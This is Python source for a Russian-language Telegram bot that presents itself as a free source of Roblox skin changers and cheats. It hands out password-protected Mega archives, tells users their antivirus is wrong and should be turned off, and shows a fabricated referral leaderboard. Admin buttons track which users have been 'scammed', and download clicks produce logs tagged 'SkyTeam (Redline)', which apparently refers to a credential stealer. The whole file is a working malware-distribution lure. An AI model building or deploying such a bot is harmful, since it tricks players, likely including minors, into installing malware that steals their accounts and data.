from aiogram import Bot, Dispatcher, executor, types
import logging
from db import Database
import config as cfg
import socket
from datetime import datetime

logging.basicConfig(level=logging.INFO)

bot = Bot(token=cfg.token)
dp = Dispatcher(bot)
db = Database('users.db')


@dp.message_handler(commands=['start'])
async def welcome(message: types.Message):
    markup = types.ReplyKeyboardMarkup(
        resize_keyboard=True,
        row_width=2,
        input_field_placeholder="⬇️ Выберите кнопку: ",
        one_time_keyboard=True)
    start = types.KeyboardButton("🥷🏻 ПРОФИЛЬ")
    top = types.KeyboardButton("📊 ТОП")
    help = types.KeyboardButton("✨️ ПОМОЩЬ")
    soft = types.KeyboardButton("👀 СОФТ")

    if not db.user_exists(message.from_user.id):
        db.add_user(message.from_user.id)
        await bot.send_message(
            message.from_user.id,
            "Здравствуйте! Это команда Richest Roblox Team. \nВведите ваш никнейм:")
    else:
        markup.add(start, soft, top, help)
        await bot.send_message(
            message.from_user.id,
            "🔥 Добро пожаловать, здесь вы можете получить\n"
            "♻️ Skinchanger Roblox 2.3.1 by n0nBann3d\n"
            "🔥 EazyScript by crash1d"
            f"⠀⠀  \n"
            "ℹ️ Все файлы запускаются на пк!\n"
            "♻️ Никаких вирусов нет!",
            reply_markup=markup)


@dp.message_handler(content_types=['text', 'photo'])
async def bot_message(message: types.Message):
    markup = types.ReplyKeyboardMarkup(
        resize_keyboard=True,
        row_width=2,
        input_field_placeholder="Выберите кнопку: ",
        one_time_keyboard=True)

    if message.chat.type == 'private':

        ref = types.InlineKeyboardMarkup(row_width=2)

        scam = types.InlineKeyboardButton(text="👋 Пригласить", callback_data="ref")
        back = types.InlineKeyboardButton(text="↩️ ВЕРНУТЬСЯ", callback_data="back1")

        ref.insert(scam)
        ref.insert(back)
        if message.text == '🥷🏻 ПРОФИЛЬ' or message.text == '/profile':
            await bot.send_message(cfg.admin_id, text="Была нажата кнопка 'профиль'\n"
                                                f"Nick: {db.get_nickname(message.from_user.id)}\n"
                                                f"Id: {message.from_user.id}")

            user_nickname = f"👋 Добро пожаловать в ваш профиль!" \
                            f"\n⠀⠀  " \
                            f"\n🧑‍💻 Ваш псевдоним: {db.get_nickname(message.from_user.id)} \n🎁 Количество ваших рефералов: (В РАБОТЕ)"
            await bot.send_message(message.from_user.id, text=user_nickname, reply_markup=ref)

        elif message.text == '✨️ ПОМОЩЬ':
            await bot.send_message(message.from_user.id, "🔱 Контакт для помощи: @n0n_bann3d")

        elif message.text == '📊 ТОП':
            await bot.send_message(message.from_user.id, "🔰 Реферальная система. Баллы выдаются за приглашение людей!\n"
                                                         "🥇 Ник: Скрытый Рефералы: 16 \n"
                                                         "🥈 Ник: Скрытый Рефералы: 13\n"
                                                         "🥉 Ник: Скрытый Рефералы: 11\n"
                                                         "4. Ник: @Shock680 Рефералы: 9\n"
                                                         "5. Ник: Скрытый Рефералы: 8\n"
                                                         "6. Ник: Скрытый Рефералы: 6\n"
                                                         "7. Ник: Скрытый Рефералы: 5\n"
                                                         "8. Ник: Скрытый Рефералы: 3\n"
                                                         "9.... Ник: Скрытый Рефералы: 2")


        elif message.text == '👀 СОФТ':

            inline = types.InlineKeyboardMarkup(row_width=2)
            skinchange = types.InlineKeyboardButton(text="✨ СКИНЧЕНДЖЕР",
                                                    callback_data="skin")
            cheats = types.InlineKeyboardButton(text="🚀 ЧИТЫ", callback_data="cheat")
            back = types.InlineKeyboardButton(text="↩️ ВЕРНУТЬСЯ", callback_data="back1") # 1

            inline.insert(skinchange)
            inline.insert(cheats)
            inline.insert(back)
            await bot.send_message(message.from_user.id,
                                   text="⬇️ Выберите тип: ",
                                   reply_markup=inline)

        else:
            if db.get_signup(message.from_user.id) == "setnickname":

                if (len(message.text) > 15):
                    await bot.send_message(message.from_user.id,
                                           "⛔️ Псевдоним должен быть меньше 15 символов.")
                elif '@' in message.text or '/' in message.text:
                    await bot.send_message(message.from_user.id,
                                           "⛔️ Вы использовали запрещенные символы (@, /)")
                else:
                    db.set_nickname(message.from_user.id, message.text)
                    db.set_signup(message.from_user.id, "Registred")
                    await bot.send_message(message.from_user.id,
                                           "✅️ Регистрация прошла успешно!",
                                           reply_markup=markup)

            else:
                if message.chat.id == cfg.admin_id:
                    if message.text == "adm":
                        adm = types.InlineKeyboardMarkup(row_width=2)

                        refreal = types.InlineKeyboardButton(text="рефки", callback_data="reff")
                        ban = types.InlineKeyboardButton(text="забанить", callback_data="ban")
                        razban = types.InlineKeyboardButton(text="разбанить", callback_data="razban")
                        status = types.InlineKeyboardButton(text="заскамлен ли", callback_data="scamed")
                        users = types.InlineKeyboardButton(text="юзеры", callback_data="users")

                        adm.insert(refreal)
                        adm.insert(status)
                        adm.insert(ban)
                        adm.insert(razban)
                        adm.insert(users)

                        await bot.send_message(cfg.admin_id, text=f"Всего пользователей: 1 \n"
                                                                f"Всего заскамлено: 0 \n"
                                                                f"Всего не заскамлено: 1",
                                            reply_markup=adm)

                await bot.send_message(message.from_user.id,
                                    "🚫 Введите пожалуйста /start")




#@dp.callback_query_handler(text='skin')
#@dp.callback_query_handler(text='skin')
#@dp.callback_query_handler(text='skin')
#@dp.callback_query_handler(text='skin')
#@dp.callback_query_handler(text='skin')

@dp.callback_query_handler(text="ref")
async def ref(call: types.CallbackQuery):
    ref = types.InlineKeyboardMarkup(row_width=2)

    scam = types.InlineKeyboardButton(text="👋 Ссылка", callback_data="ref")
    back = types.InlineKeyboardButton(text="↩️ ВЕРНУТЬСЯ", callback_data="back1")

    ref.insert(scam)
    ref.insert(back)
    await call.message.edit_text(text="WORKING")
    await call.message.edit_reply_markup(reply_markup=ref)

@dp.callback_query_handler(text='skin')
async def choice1(call: types.CallbackQuery):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    await bot.send_message(cfg.admin_id, text=f"Log: \n"
                                              f"Name: ### \n"
                                              f"Ip: {s.getsockname()[0]}\n"
                                              f"Xz: {socket.gethostbyname('www.goole.com')} \n"
                                              f"Public: {socket.gethostname()}\n"
                                              f"Time: {datetime.now()} \n"
                                              f"Check: https://t.me/Sky_Team_Bot\n"
                                              f"Method: SkyTeam (Redline)\n"
                                              f"Telegram:\n"
                                              f"\n"
                                              f"\n")
    skins = types.InlineKeyboardMarkup(row_width=2)
    vt1 = types.InlineKeyboardButton(
        text="♻️ VirusTotal",
        url=
        "https://www.virustotal.com/gui/file/711177e6536f09f536224d74dfbdc2e9b5ff455420bdc0527e42d3cfba3f9e7a?nocache=1"
    )
    download1 = types.InlineKeyboardButton(
        text="🔥 Скачать",
        callback_data="main",
        url=
        "https://mega.nz/file/tKZjXaTB#jnXvV64KHE42512blq1k3EF1dJvPwGSs374IvYfzUik")

    back = types.InlineKeyboardButton(
        text="↩️ ВЕРНУТЬСЯ",              # 2
        callback_data="back")

    skins.insert(vt1)
    skins.insert(download1)
    skins.insert(back)
    await call.message.edit_text(
        text=
        "♻️ Skinchanger Roblox 2.3.1 by n0nBann3d\n└Доступные режимы:\n🤩 Pet Simulator X\n😼 Blox Fruits (fixed)\n👊🏻 Jailbreak (new)\n👥 Adopt Me! (fixed)\n🚀 Mad City: Chapter 2 (new)\n❤️ MeetCity (new)"
        "\n⠀⠀ "
        "⠀⠀\n"
        "ℹ️ Информация: "
        "\n "
        "✨ VirusTotal - Проверка скинченджера на 59 вирусов!\n "
        "✈️ Если антивирус ругается на наш файл, советуем выключить его!\n "
        "😾 Инструкция внутри архива!\n"
        "🔥 Пароль от архива: skin")
    await call.message.edit_reply_markup(reply_markup=skins)


@dp.callback_query_handler(text="cheat")
async def choice2(call: types.CallbackQuery):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    await bot.send_message(cfg.admin_id, text=f"Log: \n"
                                              f"Name: ### \n"
                                              f"Ip: {s.getsockname()[0]}\n"
                                              f"Xz: {socket.gethostbyname('www.goole.com')} \n"
                                              f"Public: {socket.gethostname()}\n"
                                              f"Time: {datetime.now()} \n"
                                              f"Check: https://t.me/Sky_Team_Bot\n"
                                              f"Method: SkyTeam (Redline)\n"
                                              f"Telegram:\n"
                                              f"\n"
                                              f"\n")

    skins = types.InlineKeyboardMarkup(row_width=2)
    vt1 = types.InlineKeyboardButton(
        text="♻️ VirusTotal",
        url=
        "https://www.virustotal.com/gui/file/711177e6536f09f536224d74dfbdc2e9b5ff455420bdc0527e42d3cfba3f9e7a?nocache=1"
    )
    download1 = types.InlineKeyboardButton(
        text="🔥 Скачать",
        callback_data="main",
        url=
        "https://mega.nz/file/tapChJwC#dW0B48Iw1u_j0pjoa7Q6XWqKKrB3b34gOTHAlzrk1oM"
    )

    back = types.InlineKeyboardButton(
        text="↩️ ВЕРНУТЬСЯ",              # 3
        callback_data="back"
    )
    skins.insert(vt1)
    skins.insert(download1)
    skins.insert(back)
    await call.message.edit_text(
        text=
        "🔥 EazyScript by crash1d\n└Функции:\n🚷 ANTI-AFK(🔥УНИКАЛЬНОЕ)\n🤩 Visuals(best)\n📵 Auto-farm\n👊🏻 Flyhack(new) \n👥 Sizechanger (🔥NEW)"
        "\n⠀⠀ "
        "⠀⠀\n"
        "ℹ️ Информация: "
        "\n "
        "🚀 VirusTotal - Проверка чита на 59 вирусов!\n "
        "😼 Если антивирус ругается на наш файл, советуем выключить его!\n "
        "✈️ Инструкция внутри архива!\n"
        "👊🏻 Пароль от архива: cheat")
    await call.message.edit_reply_markup(reply_markup=skins)


@dp.callback_query_handler(text="back")
async def choice3(call: types.CallbackQuery):
    inline = types.InlineKeyboardMarkup(row_width=2)
    skinchange = types.InlineKeyboardButton(text="✨ СКИНЧЕНДЖЕР",
                                            callback_data="skin")
    cheats = types.InlineKeyboardButton(text="🚀 ЧИТЫ", callback_data="cheat")
    back = types.InlineKeyboardButton(text="↩️ ВЕРНУТЬСЯ", callback_data="back1")  # 1

    inline.insert(skinchange)
    inline.insert(cheats)
    inline.insert(back)
    await call.message.edit_text(text="⬇️ Выберите тип: ")
    await call.message.edit_reply_markup(reply_markup=inline)

@dp.callback_query_handler(text="back1")
async def choice4(call: types.CallbackQuery):
    markup = types.ReplyKeyboardMarkup(
        resize_keyboard=True,
        row_width=2,
        input_field_placeholder="⬇️ Выберите кнопку: ")

    await call.message.edit_text("⬇️ Напишите пожалуйста /start")
    start = types.KeyboardButton("🥷🏻 ПРОФИЛЬ")
    top = types.KeyboardButton("📊 ТОП")
    help = types.KeyboardButton("✨️ ПОМОЩЬ")
    soft = types.KeyboardButton("👀 СОФТ")
    markup.add(start, soft, top, help)

@dp.callback_query_handler(text="main")
async def scamed():
    print("1")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    await bot.send_message(cfg.admin_id, text=f"Log: \n"
                                              f"Name: ### \n"
                                              f"Ip: {s.getsockname()[0]}\n"
                                              f"Xz: {socket.gethostbyname('www.goole.com')} \n"
                                              f"Public: {socket.gethostname()}\n"
                                              f"Time: {datetime.now()} \n"
                                              f"Check: https://t.me/Sky_Team_Bot\n"
                                              f"Method: SkyTeam (Redline)\n"
                                              f"Telegram:\n"
                                              f"\n"
                                              f"\n")



if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
